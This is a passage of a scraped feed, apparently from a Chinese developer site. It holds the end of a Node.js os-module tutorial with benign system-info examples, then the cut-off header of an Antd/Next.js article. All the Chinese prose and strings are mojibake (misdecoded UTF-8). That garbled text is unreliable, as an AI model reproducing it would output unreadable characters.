<span class="hljs-keyword">const</span> days = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(uptime / <span class="hljs-number">86400</span>);
<span class="hljs-keyword">const</span> hours = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((uptime % <span class="hljs-number">86400</span>) / <span class="hljs-number">3600</span>);
<span class="hljs-keyword">const</span> minutes = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((uptime % <span class="hljs-number">3600</span>) / <span class="hljs-number">60</span>);
<span class="hljs-keyword">const</span> seconds = uptime % <span class="hljs-number">60</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç³»ç»Ÿè¿è¡Œæ—¶é—´: <span class="hljs-subst">${days}</span>å¤© <span class="hljs-subst">${hours}</span>å°æ—¶ <span class="hljs-subst">${minutes}</span>åˆ†é’Ÿ <span class="hljs-subst">${seconds}</span>ç§’`</span>);
</code></pre>
<h4 data-id="heading-54"><code>os.homedir()</code> - è·å–ç”¨æˆ·ä¸»ç›®å½•</h4>
<p>è¿”å›å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•è·¯å¾„ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(os.<span class="hljs-title function_">homedir</span>());
<span class="hljs-comment">// Windows: 'C:\\Users\\username'</span>
<span class="hljs-comment">// Linux/macOS: '/home/username'</span>
</code></pre>
<h4 data-id="heading-55"><code>os.tmpdir()</code> - è·å–ä¸´æ—¶ç›®å½•</h4>
<p>è¿”å›æ“ä½œç³»ç»Ÿçš„ä¸´æ—¶æ–‡ä»¶ç›®å½•è·¯å¾„ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(os.<span class="hljs-title function_">tmpdir</span>());
<span class="hljs-comment">// Windows: 'C:\\Users\\username\\AppData\\Local\\Temp'</span>
<span class="hljs-comment">// Linux: '/tmp'</span>
<span class="hljs-comment">// macOS: '/var/folders/...'</span>
</code></pre>
<h4 data-id="heading-56"><code>os.networkInterfaces()</code> - è·å–ç½‘ç»œæ¥å£</h4>
<p>è¿”å›ç½‘ç»œæ¥å£ä¿¡æ¯å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-keyword">const</span> interfaces = os.<span class="hljs-title function_">networkInterfaces</span>();

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> name <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(interfaces)) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ¥å£: <span class="hljs-subst">${name}</span>`</span>);
  interfaces[name].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">iface</span> =&gt;</span> {
    <span class="hljs-comment">// å…¼å®¹ä¸åŒ Node.js ç‰ˆæœ¬ï¼šfamily å¯èƒ½æ˜¯ 'IPv4' æˆ– 4</span>
    <span class="hljs-keyword">const</span> isIPv4 = iface.<span class="hljs-property">family</span> === <span class="hljs-string">'IPv4'</span> || iface.<span class="hljs-property">family</span> === <span class="hljs-number">4</span>;
    <span class="hljs-keyword">if</span> (isIPv4 &amp;&amp; !iface.<span class="hljs-property">internal</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  IPv4: <span class="hljs-subst">${iface.address}</span>`</span>);
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`  å­ç½‘æ©ç : <span class="hljs-subst">${iface.netmask}</span>`</span>);
    }
  });
}

<span class="hljs-comment">// è·å–æœ¬æœº IP åœ°å€</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getLocalIP</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> interfaces = os.<span class="hljs-title function_">networkInterfaces</span>();
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> name <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(interfaces)) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> iface <span class="hljs-keyword">of</span> interfaces[name]) {
      <span class="hljs-comment">// å…¼å®¹ä¸åŒ Node.js ç‰ˆæœ¬ï¼šfamily å¯èƒ½æ˜¯ 'IPv4' æˆ– 4</span>
      <span class="hljs-keyword">const</span> isIPv4 = iface.<span class="hljs-property">family</span> === <span class="hljs-string">'IPv4'</span> || iface.<span class="hljs-property">family</span> === <span class="hljs-number">4</span>;
      <span class="hljs-keyword">if</span> (isIPv4 &amp;&amp; !iface.<span class="hljs-property">internal</span>) {
        <span class="hljs-keyword">return</span> iface.<span class="hljs-property">address</span>;
      }
    }
  }
  <span class="hljs-keyword">return</span> <span class="hljs-string">'127.0.0.1'</span>;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æœ¬æœº IP: <span class="hljs-subst">${getLocalIP()}</span>`</span>);
</code></pre>
<h4 data-id="heading-57"><code>os.endianness()</code> - è·å–å­—èŠ‚åº</h4>
<p>è¿”å› CPU çš„å­—èŠ‚åºã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(os.<span class="hljs-title function_">endianness</span>());
<span class="hljs-comment">// 'BE' - å¤§ç«¯åº</span>
<span class="hljs-comment">// 'LE' - å°ç«¯åºï¼ˆå¸¸è§ï¼‰</span>
</code></pre>
<h4 data-id="heading-58"><code>os.EOL</code> - è¡Œå°¾æ ‡è¯†ç¬¦</h4>
<p>è¿”å›æ“ä½œç³»ç»Ÿçš„è¡Œå°¾æ ‡è¯†ç¬¦ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(os.<span class="hljs-property">EOL</span>);
<span class="hljs-comment">// Windows: '\r\n'</span>
<span class="hljs-comment">// Unix/Linux/macOS: '\n'</span>

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> content = <span class="hljs-string">`ç¬¬ä¸€è¡Œ<span class="hljs-subst">${os.EOL}</span>ç¬¬äºŒè¡Œ<span class="hljs-subst">${os.EOL}</span>ç¬¬ä¸‰è¡Œ`</span>;
</code></pre>
<h3 data-id="heading-59">5.3 å®ç”¨ç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">'os'</span>);

<span class="hljs-comment">// ç¤ºä¾‹1ï¼šç³»ç»Ÿä¿¡æ¯æ±‡æ€»</span>
<span class="hljs-comment">// è·å–æœ¬æœº IP åœ°å€çš„è¾…åŠ©å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getLocalIP</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> interfaces = os.<span class="hljs-title function_">networkInterfaces</span>();
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> name <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(interfaces)) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> iface <span class="hljs-keyword">of</span> interfaces[name]) {
      <span class="hljs-comment">// å…¼å®¹ä¸åŒ Node.js ç‰ˆæœ¬ï¼šfamily å¯èƒ½æ˜¯ 'IPv4' æˆ– 4</span>
      <span class="hljs-keyword">const</span> isIPv4 = iface.<span class="hljs-property">family</span> === <span class="hljs-string">'IPv4'</span> || iface.<span class="hljs-property">family</span> === <span class="hljs-number">4</span>;
      <span class="hljs-keyword">if</span> (isIPv4 &amp;&amp; !iface.<span class="hljs-property">internal</span>) {
        <span class="hljs-keyword">return</span> iface.<span class="hljs-property">address</span>;
      }
    }
  }
  <span class="hljs-keyword">return</span> <span class="hljs-string">'127.0.0.1'</span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">getSystemInfo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">platform</span>: os.<span class="hljs-title function_">platform</span>(),
    <span class="hljs-attr">arch</span>: os.<span class="hljs-title function_">arch</span>(),
    <span class="hljs-attr">hostname</span>: os.<span class="hljs-title function_">hostname</span>(),
    <span class="hljs-attr">type</span>: os.<span class="hljs-title function_">type</span>(),
    <span class="hljs-attr">release</span>: os.<span class="hljs-title function_">release</span>(),
    <span class="hljs-attr">uptime</span>: <span class="hljs-title function_">formatUptime</span>(os.<span class="hljs-title function_">uptime</span>()),
    <span class="hljs-attr">cpus</span>: {
      <span class="hljs-attr">count</span>: os.<span class="hljs-title function_">cpus</span>().<span class="hljs-property">length</span>,
      <span class="hljs-attr">model</span>: os.<span class="hljs-title function_">cpus</span>()[<span class="hljs-number">0</span>].<span class="hljs-property">model</span>
    },
    <span class="hljs-attr">memory</span>: {
      <span class="hljs-attr">total</span>: <span class="hljs-title function_">formatBytes</span>(os.<span class="hljs-title function_">totalmem</span>()),
      <span class="hljs-attr">free</span>: <span class="hljs-title function_">formatBytes</span>(os.<span class="hljs-title function_">freemem</span>()),
      <span class="hljs-attr">used</span>: <span class="hljs-title function_">formatBytes</span>(os.<span class="hljs-title function_">totalmem</span>() - os.<span class="hljs-title function_">freemem</span>()),
      <span class="hljs-attr">usagePercent</span>: ((os.<span class="hljs-title function_">totalmem</span>() - os.<span class="hljs-title function_">freemem</span>()) / os.<span class="hljs-title function_">totalmem</span>() * <span class="hljs-number">100</span>).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>) + <span class="hljs-string">'%'</span>
    },
    <span class="hljs-attr">network</span>: <span class="hljs-title function_">getLocalIP</span>()
  };
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">formatBytes</span>(<span class="hljs-params">bytes</span>) {
  <span class="hljs-keyword">const</span> sizes = [<span class="hljs-string">'B'</span>, <span class="hljs-string">'KB'</span>, <span class="hljs-string">'MB'</span>, <span class="hljs-string">'GB'</span>, <span class="hljs-string">'TB'</span>];
  <span class="hljs-keyword">if</span> (bytes === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">'0 B'</span>;
  <span class="hljs-keyword">const</span> i = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(bytes) / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1024</span>));
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(bytes / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">1024</span>, i) * <span class="hljs-number">100</span>) / <span class="hljs-number">100</span> + <span class="hljs-string">' '</span> + sizes[i];
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">formatUptime</span>(<span class="hljs-params">seconds</span>) {
  <span class="hljs-keyword">const</span> days = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(seconds / <span class="hljs-number">86400</span>);
  <span class="hljs-keyword">const</span> hours = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((seconds % <span class="hljs-number">86400</span>) / <span class="hljs-number">3600</span>);
  <span class="hljs-keyword">const</span> minutes = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((seconds % <span class="hljs-number">3600</span>) / <span class="hljs-number">60</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${days}</span>å¤© <span class="hljs-subst">${hours}</span>å°æ—¶ <span class="hljs-subst">${minutes}</span>åˆ†é’Ÿ`</span>;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getSystemInfo</span>());

<span class="hljs-comment">// ç¤ºä¾‹2ï¼šç›‘æ§ç³»ç»Ÿèµ„æº</span>
<span class="hljs-comment">// è®¡ç®— CPU ä½¿ç”¨ç‡çš„è¾…åŠ©å‡½æ•°ï¼ˆç®€åŒ–ç‰ˆæœ¬ï¼Œå®é™…ä½¿ç”¨æ—¶å»ºè®®ä½¿ç”¨ä¸¤æ¬¡é‡‡æ ·ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getCPUUsage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> cpus = os.<span class="hljs-title function_">cpus</span>();
  <span class="hljs-keyword">let</span> totalIdle = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> totalTick = <span class="hljs-number">0</span>;
  
  cpus.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">cpu</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> times = cpu.<span class="hljs-property">times</span>;
    totalIdle += times.<span class="hljs-property">idle</span>;
    totalTick += times.<span class="hljs-property">user</span> + times.<span class="hljs-property">nice</span> + times.<span class="hljs-property">sys</span> + times.<span class="hljs-property">idle</span> + times.<span class="hljs-property">irq</span>;
  });
  
  <span class="hljs-keyword">const</span> idle = totalIdle / cpus.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> total = totalTick / cpus.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">const</span> usage = <span class="hljs-number">100</span> - ~~(<span class="hljs-number">100</span> * idle / total);
  
  <span class="hljs-keyword">return</span> usage;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">monitorSystem</span>(<span class="hljs-params">interval = <span class="hljs-number">5000</span></span>) {
  <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> memUsage = (os.<span class="hljs-title function_">totalmem</span>() - os.<span class="hljs-title function_">freemem</span>()) / os.<span class="hljs-title function_">totalmem</span>() * <span class="hljs-number">100</span>;
    <span class="hljs-comment">// æ³¨æ„ï¼šgetCPUUsage() éœ€è¦ä¸¤æ¬¡é‡‡æ ·æ‰èƒ½å‡†ç¡®ï¼Œè¿™é‡Œä»…ä½œæ¼”ç¤º</span>
    <span class="hljs-keyword">const</span> cpuUsage = <span class="hljs-title function_">getCPUUsage</span>();
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å†…å­˜ä½¿ç”¨ç‡: <span class="hljs-subst">${memUsage.toFixed(<span class="hljs-number">2</span>)}</span>%`</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`CPU ä½¿ç”¨ç‡: <span class="hljs-subst">${cpuUsage}</span>%`</span>);
    
    <span class="hljs-keyword">if</span> (memUsage &gt; <span class="hljs-number">90</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'è­¦å‘Š: å†…å­˜ä½¿ç”¨ç‡è¿‡é«˜!'</span>);
    }
    <span class="hljs-keyword">if</span> (cpuUsage &gt; <span class="hljs-number">90</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'è­¦å‘Š: CPU ä½¿ç”¨ç‡è¿‡é«˜!'</span>);
    }
  }, interval);
}

<span class="hljs-comment">// ç¤ºä¾‹3ï¼šæ ¹æ®å¹³å°é€‰æ‹©ä¸åŒçš„è¡Œä¸º</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">platformSpecificAction</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">switch</span> (os.<span class="hljs-title function_">platform</span>()) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'win32'</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Windows ç‰¹å®šæ“ä½œ'</span>);
      <span class="hljs-comment">// Windows ç‰¹å®šä»£ç </span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">'darwin'</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'macOS ç‰¹å®šæ“ä½œ'</span>);
      <span class="hljs-comment">// macOS ç‰¹å®šä»£ç </span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">'linux'</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Linux ç‰¹å®šæ“ä½œ'</span>);
      <span class="hljs-comment">// Linux ç‰¹å®šä»£ç </span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-attr">default</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å…¶ä»–å¹³å°'</span>);
  }
}

<span class="hljs-comment">// ç¤ºä¾‹4ï¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶è·¯å¾„</span>
<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createTempFilePath</span>(<span class="hljs-params">prefix = <span class="hljs-string">'temp'</span>, suffix = <span class="hljs-string">'.txt'</span></span>) {
  <span class="hljs-keyword">const</span> tmpDir = os.<span class="hljs-title function_">tmpdir</span>();
  <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
  <span class="hljs-keyword">const</span> random = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>().<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>).<span class="hljs-title function_">substring</span>(<span class="hljs-number">7</span>);
  <span class="hljs-keyword">return</span> path.<span class="hljs-title function_">join</span>(tmpDir, <span class="hljs-string">`<span class="hljs-subst">${prefix}</span>-<span class="hljs-subst">${timestamp}</span>-<span class="hljs-subst">${random}</span><span class="hljs-subst">${suffix}</span>`</span>);
}

<span class="hljs-comment">// ç¤ºä¾‹5ï¼šæ£€æµ‹ç³»ç»Ÿè´Ÿè½½</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getSystemLoad</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> cpus = os.<span class="hljs-title function_">cpus</span>();
  <span class="hljs-keyword">const</span> load = cpus.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">cpu</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> total = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(cpu.<span class="hljs-property">times</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b);
    <span class="hljs-keyword">const</span> usage = ((total - cpu.<span class="hljs-property">times</span>.<span class="hljs-property">idle</span>) / total * <span class="hljs-number">100</span>).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseFloat</span>(usage);
  });
  
  <span class="hljs-keyword">const</span> avgLoad = (load.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / load.<span class="hljs-property">length</span>).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>);
  
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">perCore</span>: load,
    <span class="hljs-attr">average</span>: <span class="hljs-built_in">parseFloat</span>(avgLoad)
  };
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç³»ç»Ÿè´Ÿè½½:'</span>, <span class="hljs-title function_">getSystemLoad</span>());
</code></pre>
<hr/>
<h2 data-id="heading-60">æ€»ç»“</h2>
<p>æœ¬æ–‡è¯¦ç»†ä»‹ç»äº† Node.js ä¸­äº”ä¸ªé‡è¦çš„å·¥å…·æ¨¡å—ï¼š</p>
<ol>
<li><strong>path æ¨¡å—</strong>ï¼šå¤„ç†æ–‡ä»¶è·¯å¾„ï¼Œæä¾›è·¨å¹³å°å…¼å®¹æ€§</li>
<li><strong>url æ¨¡å—</strong>ï¼šè§£æå’Œæ ¼å¼åŒ– URLï¼Œæ¨èä½¿ç”¨ WHATWG URL API</li>
<li><strong>querystring æ¨¡å—</strong>ï¼šå¤„ç†æŸ¥è¯¢å­—ç¬¦ä¸²çš„è§£æå’Œåºåˆ—åŒ–</li>
<li><strong>util æ¨¡å—</strong>ï¼šæä¾›å„ç§å®ç”¨å·¥å…·å‡½æ•°ï¼Œå¦‚ç±»å‹æ£€æŸ¥ã€Promise è½¬æ¢ã€è°ƒè¯•ç­‰</li>
<li><strong>os æ¨¡å—</strong>ï¼šè·å–æ“ä½œç³»ç»Ÿç›¸å…³ä¿¡æ¯ï¼Œå¦‚å¹³å°ã€CPUã€å†…å­˜ç­‰</li>
</ol>
<p>è¿™äº›æ¨¡å—éƒ½æ˜¯ Node.js çš„å†…ç½®æ¨¡å—ï¼Œæ— éœ€å®‰è£…å³å¯ä½¿ç”¨ã€‚ç†Ÿç»ƒæŒæ¡è¿™äº›æ¨¡å—èƒ½å¤Ÿå¤§å¤§æé«˜å¼€å‘æ•ˆç‡ï¼Œè®©ä»£ç æ›´åŠ å¥å£®å’Œå¯ç»´æŠ¤ã€‚</p>
<h3 data-id="heading-61">æœ€ä½³å®è·µå»ºè®®</h3>
<ol>
<li><strong>è·¯å¾„å¤„ç†</strong>ï¼šå§‹ç»ˆä½¿ç”¨ <code>path.join()</code> å’Œ <code>path.resolve()</code> è€Œä¸æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥</li>
<li><strong>URL å¤„ç†</strong>ï¼šä½¿ç”¨ WHATWG URL APIï¼ˆ<code>URL</code> å’Œ <code>URLSearchParams</code>ï¼‰</li>
<li><strong>æŸ¥è¯¢å­—ç¬¦ä¸²</strong>ï¼šå¯¹äºç®€å•åœºæ™¯ä½¿ç”¨ <code>querystring</code>ï¼Œå¤æ‚åœºæ™¯ä½¿ç”¨ <code>URLSearchParams</code></li>
<li><strong>å¼‚æ­¥è½¬æ¢</strong>ï¼šä½¿ç”¨ <code>util.promisify()</code> å°†å›è°ƒå‡½æ•°è½¬æ¢ä¸º Promise</li>
<li><strong>ç³»ç»Ÿä¿¡æ¯</strong>ï¼šä½¿ç”¨ <code>os</code> æ¨¡å—è¿›è¡Œè·¨å¹³å°å…¼å®¹æ€§å¤„ç†</li>
<li><strong>ç»§æ‰¿</strong>ï¼šä½¿ç”¨ ES6 çš„ <code>class</code> å’Œ <code>extends</code> è¯­æ³•ï¼Œè€Œä¸æ˜¯å·²å¼ƒç”¨çš„ <code>util.inherits()</code></li>
</ol>
<hr/>
<blockquote>
<p><strong>å‚è€ƒèµ„æºï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fen%2Fdocs%2F" target="_blank" title="https://nodejs.org/en/docs/" ref="nofollow noopener noreferrer">Node.js å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.w3schools.com%2Fnodejs%2Fdefault.asp" target="_blank" title="https://www.w3schools.com/nodejs/default.asp" ref="nofollow noopener noreferrer">W3Schools Node.js æ•™ç¨‹</a></li>
</ul>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Antd5.x åœ¨ Next.js14.x é¡¹ç›®ä¸­ï¼Œåˆæ¬¡æ¸²æŸ“æ ·å¼ä¸¢å¤±]]></title>    <link>https://juejin.cn/post/7583799807593578530</link>    <guid>https://juejin.cn/post/7583799807593578530</guid>    <pubDate>2025-12-15T09:10:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583799807593578530" data-draft-id="7583903159773626383" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Antd5.x åœ¨ Next.js14.x é¡¹ç›®ä¸­ï¼Œåˆæ¬¡æ¸²æŸ“æ ·å¼ä¸¢å¤±"/> <meta itemprop="keywords" content="å‰ç«¯,React.js,Next.js"/> <meta itemprop="datePublished" content="2025-12-15T09:10:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¹¿é¹¿é¹¿é¹¿isNotDefined"/> <meta itemprop="url" content="https://juejin.cn/user/4227000939061086"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Antd5.x åœ¨ Next.js14.x é¡¹ç›®ä¸­ï¼Œåˆæ¬¡æ¸²æŸ“æ ·å¼ä¸¢å¤±
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4227000939061086/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¹¿é¹¿é¹¿é¹¿isNotDefined
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:10:49.000Z" title="Mon Dec 15 2025 09:10:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body 